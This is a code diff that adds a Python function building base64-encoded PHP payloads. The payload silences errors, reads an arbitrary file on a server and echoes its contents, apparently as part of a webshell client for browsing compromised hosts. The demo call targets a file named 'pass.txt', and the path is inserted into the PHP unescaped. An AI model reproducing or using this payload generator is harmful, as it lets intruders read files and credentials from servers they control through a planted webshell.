@@ -55,3 +55,25 @@ def getFilelistBase(path):
 
     return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
 
+
+def getFile(path):
+    """
+    指定一个文件的路径，放回该文件的信息。
+    :param path: 文件路径
+    :return: PHP-> base64  code
+    """
+    code = """
+    @ini_set("display_errors","0");
+	@set_time_limit(0);
+	@set_magic_quotes_runtime(0);
+    $path = '%s';
+    $hanlder = fopen($path, 'rb');
+    $res = fread($hanlder, filesize($path));
+    fclose($hanlder);
+    echo $res;
+    """% path
+    return base64.b64encode(code.encode("UTF-8")).decode("UTF-8")
+
+
+if __name__ == '__main__':
+    print(getFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/pass.txt"))
